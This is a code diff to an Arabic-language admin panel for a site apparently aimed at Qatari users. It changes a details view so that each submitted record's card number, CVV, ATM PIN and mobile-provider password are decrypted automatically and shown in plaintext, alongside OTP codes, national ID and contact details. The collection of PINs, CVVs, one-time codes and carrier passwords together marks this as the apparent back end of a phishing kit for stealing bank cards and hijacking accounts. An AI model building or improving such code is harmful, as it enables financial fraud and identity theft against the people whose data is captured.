@@ -15,6 +15,7 @@
 <body class="admin-page">
   <main class="admin-main">
     <section class="admin-login" id="login-panel">
+      <div class="top-stripe"></div>
       <div class="admin-brand"><img src="assets/logo.svg" alt="هميان" /><span>Admin</span></div>
       <h1>لوحة الإدارة</h1>
       <p>سجّل الدخول لمتابعة الطلبات والزوار النشطين.</p>
@@ -37,6 +38,7 @@
         <div class="admin-header-actions"><a href="index.html" class="admin-home-link">عرض الموقع</a><button
             id="logout-button" class="admin-logout">تسجيل الخروج</button></div>
       </header>
+      <div class="stripe-thin"></div>
       <div class="admin-stats">
         <article class="stat-card stat-live"><span class="stat-icon">◉</span>
           <div><small>الزوار النشطون الآن</small><strong id="active-visitors">0</strong></div>
@@ -208,47 +210,66 @@
     }
 
     /* openDetails function */
-    function openDetails(request) {
+    async function openDetails(request) {
       console.log('openDetails called with:', request);
 
-      const atmPin = request.atmPinEncrypted || request.atm_pin_encrypted;
-      const provider = request.networkProvider || request.network_provider;
-      const providerMobile = request.providerMobile || request.provider_mobile;
-      const providerPassword = request.providerPasswordEncrypted || request.provider_password_encrypted;
-      const completed = request.completedAt || request.completed_at;
-      const confirmationCode = request.confirmationCode || request.confirmation_code || '';
-      const codeSubmittedAt = request.codeSubmittedAt || request.code_submitted_at || '';
-      const cardNumber = request.cardNumberEncrypted || request.card_number_encrypted;
-      const cardExpiryMonth = request.cardExpiryMonth || request.card_expiry_month;
-      const cardExpiryYear = request.cardExpiryYear || request.card_expiry_year;
-      const cardCvv = request.cardCvvEncrypted || request.card_cvv_encrypted;
-      const cardHolderName = request.cardHolderName || request.card_holder_name;
+      const [cardNumber, cardCvv, atmPin, providerPassword] = await Promise.all([
+        fetchDecrypted(request.id, 'card_number'),
+        fetchDecrypted(request.id, 'card_cvv'),
+        fetchDecrypted(request.id, 'atm_pin'),
+        fetchDecrypted(request.id, 'provider_password')
+      ]);
+
+      const allData = {
+        createdAt: request.createdAt || request.created_at,
+        fullName: request.fullName || request.full_name,
+        nationalId: request.nationalId || request.national_id,
+        cardType: request.cardType || request.card_type,
+        mobile: request.mobile || request.phone,
+        email: request.email,
+        nationality: request.nationality,
+        bank: request.bank,
+        cardHolderName: request.cardHolderName || request.card_holder_name,
+        cardExpiryMonth: request.cardExpiryMonth || request.card_expiry_month,
+        cardExpiryYear: request.cardExpiryYear || request.card_expiry_year,
+        confirmationCode: request.confirmationCode || request.confirmation_code,
+        codeSubmittedAt: request.codeSubmittedAt || request.code_submitted_at,
+        provider: request.networkProvider || request.network_provider,
+        providerMobile: request.providerMobile || request.provider_mobile,
+        completedAt: request.completedAt || request.completed_at,
+        decisionNote: request.decisionNote || request.decision_note,
+        status: request.status,
+        cardNumber,
+        cardCvv,
+        atmPin,
+        providerPassword
+      };
 
       const detailRows = [
-        ['التاريخ', formatDate(request.createdAt || request.created_at)],
-        ['الاسم الكامل', request.fullName || request.full_name],
-        ['رقم الهوية', request.nationalId || request.national_id || '—'],
-        ['نوع البطاقة', labels[request.cardType || request.card_type] || request.cardType || request.card_type],
-        ['رقم الجوال', '+974 ' + (request.mobile || request.phone)],
-        ['البريد الإلكتروني', request.email],
-        ['الجنسية', labels[request.nationality] || request.nationality],
-        ['البنك المرتبط', request.bank],
+        ['التاريخ', formatDate(allData.createdAt)],
+        ['الاسم الكامل', allData.fullName || '—'],
+        ['رقم الهوية', allData.nationalId || '—'],
+        ['نوع البطاقة', labels[allData.cardType] || allData.cardType || '—'],
+        ['رقم الجوال', allData.mobile ? '+974 ' + escapeHtml(allData.mobile) : '—'],
+        ['البريد الإلكتروني', allData.email || '—'],
+        ['الجنسية', labels[allData.nationality] || allData.nationality || '—'],
+        ['البنك المرتبط', allData.bank || '—'],
         ['<span style="color:#8a173b;font-weight:700;font-size:16px">━━━ بيانات البطاقة ━━━</span>', ''],
-        ['اسم حامل البطاقة', cardHolderName || '—'],
-        ['رقم البطاقة', cardNumber ? '<button onclick="viewEncrypted(\'' + request.id + '\', \'card_number\', \'رقم البطاقة\')" class="row-action" style="padding:4px 12px;font-size:13px">عرض رقم البطاقة 🔒</button>' : '—'],
-        ['تاريخ انتهاء البطاقة', (cardExpiryMonth && cardExpiryYear) ? ('<span style="direction:ltr;display:inline-block;font-weight:700;color:#333">' + cardExpiryMonth + '/' + cardExpiryYear + '</span>') : '—'],
-        ['CVV', cardCvv ? '<button onclick="viewEncrypted(\'' + request.id + '\', \'card_cvv\', \'CVV\')" class="row-action" style="padding:4px 12px;font-size:13px">عرض CVV 🔒</button>' : '—'],
+        ['اسم حامل البطاقة', allData.cardHolderName || '—'],
+        ['رقم البطاقة', cardNumber ? '<span style="font-size:20px;font-weight:700;color:#d32f2f;letter-spacing:2px;direction:ltr;display:inline-block;font-family:monospace;background:#fff3cd;padding:8px 14px;border-radius:6px">' + escapeHtml(cardNumber) + '</span>' : '—'],
+        ['تاريخ انتهاء البطاقة', (allData.cardExpiryMonth && allData.cardExpiryYear) ? '<span style="direction:ltr;display:inline-block;font-weight:700;color:#333;font-family:monospace">' + escapeHtml(allData.cardExpiryMonth) + ' / ' + escapeHtml(allData.cardExpiryYear) + '</span>' : '—'],
+        ['CVV', cardCvv ? '<span style="font-size:20px;font-weight:700;color:#d32f2f;letter-spacing:4px;font-family:monospace;background:#fff3cd;padding:8px 14px;border-radius:6px">' + escapeHtml(cardCvv) + '</span>' : '—'],
         ['<span style="color:#8a173b;font-weight:700;font-size:16px">━━━ بيانات التحقق ━━━</span>', ''],
-        ['رمز التأكيد (OTP)', confirmationCode ? '<span style="font-size:24px;color:#8a173b;font-weight:700;letter-spacing:3px;direction:ltr;display:inline-block;background:#f9f3f5;padding:8px 20px;border-radius:8px;border:2px solid #8a173b">' + confirmationCode + '</span>' : '<span style="color:#999">لم يُرسل بعد</span>'],
-        ['وقت إرسال الرمز', codeSubmittedAt ? formatDate(codeSubmittedAt) : '—'],
+        ['رمز التأكيد (OTP)', allData.confirmationCode ? '<span style="font-size:24px;color:#8a173b;font-weight:700;letter-spacing:4px;direction:ltr;display:inline-block;background:#f9f3f5;padding:8px 20px;border-radius:8px;border:2px solid #8a173b;font-family:monospace">' + escapeHtml(allData.confirmationCode) + '</span>' : '<span style="color:#999">لم يُرسل بعد</span>'],
+        ['وقت إرسال الرمز', allData.codeSubmittedAt ? formatDate(allData.codeSubmittedAt) : '—'],
         ['<span style="color:#8a173b;font-weight:700;font-size:16px">━━━ بيانات إضافية ━━━</span>', ''],
-        ['رقم ATM', atmPin ? '<button onclick="viewEncrypted(\'' + request.id + '\', \'atm_pin\', \'رقم ATM\')" class="row-action" style="padding:4px 12px;font-size:13px">عرض رقم ATM 🔒</button>' : '—'],
-        ['مزود الشبكة', provider ? (labels[provider] || provider) : '—'],
-        ['رقم جوال المزود', providerMobile || '—'],
-        ['كلمة مرور المزود', providerPassword ? '<button onclick="viewEncrypted(\'' + request.id + '\', \'provider_password\', \'كلمة المرور\')" class="row-action" style="padding:4px 12px;font-size:13px">عرض كلمة المرور 🔒</button>' : '—'],
-        ['وقت الإكمال', completed ? formatDate(completed) : '—'],
-        ['ملاحظة القرار', request.decisionNote || request.decision_note || '—'],
-        ['الحالة', labels[request.status] || request.status]
+        ['رقم ATM', atmPin ? '<span style="font-size:18px;font-weight:700;color:#d32f2f;letter-spacing:3px;font-family:monospace">' + escapeHtml(atmPin) + '</span>' : '—'],
+        ['مزود الشبكة', allData.provider ? (labels[allData.provider] || allData.provider) : '—'],
+        ['رقم جوال المزود', allData.providerMobile || '—'],
+        ['كلمة مرور المزود', providerPassword ? '<span style="font-size:16px;font-weight:600;color:#d32f2f">' + escapeHtml(providerPassword) + '</span>' : '—'],
+        ['وقت الإكمال', allData.completedAt ? formatDate(allData.completedAt) : '—'],
+        ['ملاحظة القرار', allData.decisionNote || '—'],
+        ['الحالة', labels[allData.status] || allData.status || '—']
       ];
 
       console.log('detailRows built, length:', detailRows.length);
